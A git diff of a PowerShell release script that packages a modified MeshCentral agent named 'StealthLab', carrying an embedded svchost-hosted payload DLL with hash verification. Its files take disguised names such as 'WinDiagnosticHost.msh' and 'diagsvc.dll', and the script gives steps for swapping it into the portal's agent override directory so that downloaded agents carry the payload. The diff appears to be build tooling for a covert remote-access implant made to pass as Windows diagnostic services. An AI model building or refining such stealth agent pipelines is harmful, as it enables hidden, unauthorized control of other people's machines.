@@ -11,13 +11,43 @@ $ErrorActionPreference = 'Stop'
 $scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
 $repoRoot = Split-Path -Parent $scriptRoot
 
-. (Join-Path $scriptRoot 'ResourceProbe.ps1')
 $brandingHelper = Join-Path $repoRoot 'tools\BrandingConfig.ps1'
 if (-not (Test-Path -LiteralPath $brandingHelper)) {
     throw "Branding helper missing at $brandingHelper"
 }
 . $brandingHelper
 $brandingConfigInfo = Get-BrandingConfig -RepoRoot $repoRoot -Quiet
+
+$script:EmbeddedPayloadChecked = $false
+
+function Ensure-EmbeddedPayloadReady {
+    if ($script:EmbeddedPayloadChecked) { return }
+
+    $headerPath = Join-Path $repoRoot 'meshcore\embedded\generated\svchost_payload.h'
+    if (-not (Test-Path -LiteralPath $headerPath)) {
+        throw "Embedded svchost payload header missing at $headerPath"
+    }
+
+    $metadataPath = Join-Path $repoRoot 'meshcore\embedded\generated\svchost_payload.json'
+    if (Test-Path -LiteralPath $metadataPath) {
+        try {
+            $metadata = Get-Content -LiteralPath $metadataPath -Raw | ConvertFrom-Json -ErrorAction Stop
+            if ($metadata -and $metadata.sha256 -and $metadata.input -and (Test-Path -LiteralPath $metadata.input)) {
+                $expected = ($metadata.sha256.ToString()).ToLowerInvariant()
+                $actual = ((Get-FileHash -Path $metadata.input -Algorithm SHA256).Hash).ToLowerInvariant()
+                if ($expected -ne $actual) {
+                    throw "Embedded svchost payload metadata hash mismatch (expected $expected, actual $actual)"
+                }
+            }
+        } catch {
+            throw ("Embedded svchost payload metadata invalid: {0}" -f $_.Exception.Message)
+        }
+    } else {
+        Write-Warning "svchost payload metadata not found; unable to verify source DLL hash."
+    }
+
+    $script:EmbeddedPayloadChecked = $true
+}
 
 function Resolve-OutputPath {
     param([string]$Path)
@@ -41,18 +71,14 @@ if (-not $SkipBuild) {
 
 $exeX64 = Join-Path $repoRoot "meshservice\x64\StealthLab\MeshService-2022.exe"
 $exeWin32 = Join-Path $repoRoot "meshservice\StealthLab\MeshService-2022.exe"
-$dllPayload = Join-Path $repoRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
-$embeddedPayload = Join-Path $repoRoot "meshservice\embedded\svchost_payload.dll"
+$payloadMetadata = Join-Path $repoRoot "meshcore\embedded\generated\svchost_payload.json"
 $mshPath = Join-Path $repoRoot "WinDiagnosticHost.msh"
 $brandingConfig = $brandingConfigInfo.Path
 
 if (-not (Test-Path $exeX64)) {
     throw "Expected x64 StealthLab executable not found at '$exeX64'."
 }
-
-if (-not (Test-SvchostPayload -Path $exeX64)) {
-    throw "Issued build does not contain SVCHOSTDLL payload resource: $exeX64"
-}
+Ensure-EmbeddedPayloadReady
 
 $outputRoot = Resolve-OutputPath -Path $OutputDir
 New-Item -ItemType Directory -Force -Path $outputRoot | Out-Null
@@ -92,9 +118,6 @@ if ($artifact) {
 }
 
 if ($IncludeWin32 -and (Test-Path $exeWin32)) {
-    if (-not (Test-SvchostPayload -Path $exeWin32)) {
-        throw "Win32 StealthLab executable is missing embedded payload: $exeWin32"
-    }
     $artifact = Copy-WithHash -Source $exeWin32 -DestinationName "MeshService.exe" -Description "StealthLab Win32 executable"
     if ($artifact) {
         $artifacts += $artifact
@@ -102,13 +125,11 @@ if ($IncludeWin32 -and (Test-Path $exeWin32)) {
     }
 }
 
-$artifact = Copy-WithHash -Source $dllPayload -DestinationName "diagsvc.dll" -Description "svchost payload DLL (StealthLab_DLL)"
-if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
-$artifact = Copy-WithHash -Source $embeddedPayload -DestinationName "svchost_payload.dll" -Description "Staged embedded payload for diagnostics"
-if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
 $artifact = Copy-WithHash -Source $mshPath -DestinationName "WinDiagnosticHost.msh" -Description "Provisioning data (.msh)"
 if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
 $artifact = Copy-WithHash -Source $brandingConfig -DestinationName "branding_config.local.json" -Description "Branding configuration snapshot"
+if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
+$artifact = Copy-WithHash -Source $payloadMetadata -DestinationName "svchost_payload.json" -Description "Embedded svchost payload manifest (size + SHA256)"
 if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
 
 Write-Host "[3/4] Writing metadata..." -ForegroundColor Cyan
@@ -132,11 +153,11 @@ Deployment Steps
 ----------------
 1. Copy 'MeshService64.exe' to your MeshCentral agents override directory (typically meshcentral-data\agents).
 2. Restart the MeshCentral service.
-3. Download the Windows x64 agent from the portal and verify the SVCHOSTDLL resource is present.
+3. Download the Windows x64 agent from the portal and compare its embedded payload metadata against svchost_payload.json (or rerun the runtime validation tests) to ensure extraction succeeds.
 
 Verification
 ------------
-Checksums are recorded in checksums.txt. Re-run Test-SvchostPayload for the published executable if required.
+Checksums are recorded in checksums.txt. Compare the portal-delivered agent against svchost_payload.json for payload integrity, or rerun the runtime validation tests.
 "@
 $readme | Out-File -FilePath $readmePath -Encoding UTF8
 
